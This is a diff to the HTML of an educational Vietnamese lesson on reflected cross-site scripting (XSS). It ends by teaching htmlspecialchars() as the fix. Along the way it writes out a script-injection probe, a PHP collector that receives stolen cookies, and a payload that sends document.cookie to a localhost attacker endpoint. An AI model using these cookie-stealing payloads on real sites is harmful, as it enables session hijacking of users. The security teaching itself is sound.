@@ -20,8 +20,8 @@
             <p><span class="number">3</span>Giá trị search mà bạn nhập vào đã được chèn vào source code.<br>
                 Cái gì cũng có thể chèn vào chăng?<br>
                 Bobby thử chèn một đoạn mã lệnh có khả năng gây nguy hiểm<br>
-                <span class="request">Nhập đoạn này vào thanh tìm kiếm nhé<br>
-                    &ltscript>alert(document.cookie)&lt/script>
+                <span class='red'>&ltscript>alert(document.cookie)&lt/script><br>
+                <span class="request">Nhập đoạn này vào thanh tìm kiếm nhé</span><br>
                 </span><br>
             </p>
         </div>
@@ -47,22 +47,23 @@
                 <span class="request">Hãy <a id='code-hacker' class="click">Deploy</a> phía hacker để lấy cookie của user nhé<br>Sử dụng $_GET để lấy param 'cookie'(Code by PHP)</span>
             </p>
 
-            <button class="help" type="button" data-html="true"  data-toggle="popover" data-placement="left" title="Answer" data-content="
-            if(isset($_GET['cookie']))<br>
-            {<br>
-                return $_GET['cookie'];<br>
-            }
+            <button class="help" type="button" data-html="true"  data-toggle="popover" data-placement="left" title="Answer" data-content="<pre>
+if(isset($_GET['cookie'])){
+    return $_GET['cookie'];
+}
+            </pre>
             ">?</button>
         </div>
         <div class="guide eight">
             <img class="symbol" src="images/attacker.png">
             <p><span class="number">8</span>Bobby tạo script như sau để lấy cookie của Panda<br>
-                <span class='request'>&ltscript>window.open('http://localhost/action/xss/cookie-hacker?cookie='+);&lt/script><br>
-                Đoạn mã tạo có không đúng không? hãy giúp bobby <a id='code-script' class="click">Sửa lại</a>
+                <span class='red'>&ltscript>window.open('http://localhost/action/xss/cookie-hacker?cookie='+);&lt/script></span><br>
+                <span class='request'>Đoạn mã tạo có không đúng không? hãy giúp bobby <a id='code-script' class="click">Sửa lại</a>
                 </span>
             </p>
-            <button class="help" type="button" data-toggle="popover" data-placement="left" title="Answer"
-                data-content="<script>window.open('http://localhost/action/xss/cookie-hacker?cookie='+document.cookie);</script>">?</button>
+            <button data-html="true" class="help" type="button" data-toggle="popover" data-placement="left" title="Answer"
+                data-content="<pre>&ltscript>window.open('http://localhost/action/xss/cookie-hacker?
+cookie='+document.cookie);&ltscript></pre>">?</button>
         </div>
         <div class="guide nine">
             <img class="symbol" src="images/attacker.png">
@@ -115,14 +116,22 @@
                 <span class='request'>Hãy thử suy nghĩ và <a class="click" id="code-prevent">Deploy</a></span>
             </p>
             <button class="help" type="button" data-html="true" data-toggle="popover" data-placement="left" title="Answer"
-                data-content="if(isset($_GET['search']))<br>return htmlspecialchars($_GET['search']);">?</button>
+                data-content="<pre>
+if(isset($_GET['search']))
+    return htmlspecialchars($_GET['search']);
+</pre>">?</button>
         </div>
         <div class="guide sixteen">
             <img class="symbol" src="images/user.png">
             <p><span class="number">16</span>Bằng cách sử dụng hàm <span class='emphasize'>htmlspecialchars()</span> sẽ
                 giúp thay thế các kí tự Dạng ứng dụng, <br>ví dụ: <span class='emphasize'>“<“ thành “&amp;lt;”</span><br>
                 <span class="request">Bây giờ bạn thử sử dụng script tìm kiếm trên trang shopping để kiểm tra kết quả</span>
-                        <br>Chúc mừng bạn đã hoàn thành xong cuộc tấn công <span class="name">Reflected-XSS</span><br>
+            </p>
+        </div>
+        <div class="guide seventeen">
+            <img class="symbol" src="images/user.png">
+            <p><span class="number">17</span>
+                Chúc mừng bạn đã hoàn thành xong cuộc tấn công <span class="name">Reflected-XSS</span><br>
             </p>
         </div>
 
